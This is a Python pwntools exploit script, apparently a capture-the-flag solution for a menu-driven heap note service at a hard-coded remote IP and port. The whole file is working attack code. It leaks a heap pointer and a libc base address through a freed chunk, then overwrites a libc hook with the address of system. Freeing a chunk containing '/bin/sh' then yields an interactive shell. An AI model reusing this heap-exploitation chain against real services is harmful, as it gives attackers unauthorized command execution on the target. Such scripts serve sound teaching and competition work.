from pwn import *

HOST = "49.236.136.140"
PORT = 16000
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)

def add(size,dat):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('size :')
  s.sendline(str(size))
  s.recvuntil('contents :')
  s.send(dat)

def free(index):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil('>')
  s.sendline(str(index))

def edit_name(dat):
  s.recvuntil(">")
  s.sendline('5')
  s.recvuntil('name')
  s.send(dat)

def print_chunk(index):
  s.recvuntil('>')
  s.sendline('4')
  s.recvuntil('>')
  s.sendline(str(index))

def edit_chunk(index, dat):
  s.recvuntil('>')
  s.sendline('3')
  s.recvuntil('edit')
  s.sendline(str(index))
  s.recvuntil(':')
  s.send(dat)

s.recvuntil('name')
s.send('woojin')
add(10,"/bin/sh")
add(10,"BBBB")
add(0x100,"CCCC")
add(0x100,"DDDD")
s.recvuntil('>')
s.sendline('6')
heap = u64(s.recvuntil('\n')[-7:-1]+"\x00\x00")
print "heap : ", hex(heap)

free(2)
edit_name(p64(heap+0x20))
print_chunk(1)
libc = u64(s.recvuntil('\x7f')[-6:]+'\x00\x00') - 0x3c4b78
print "libc : ", hex(libc)

edit_name(p64(libc+0x3c67a8))
edit_chunk(1,p64(libc+0x45390))
s.interactive()
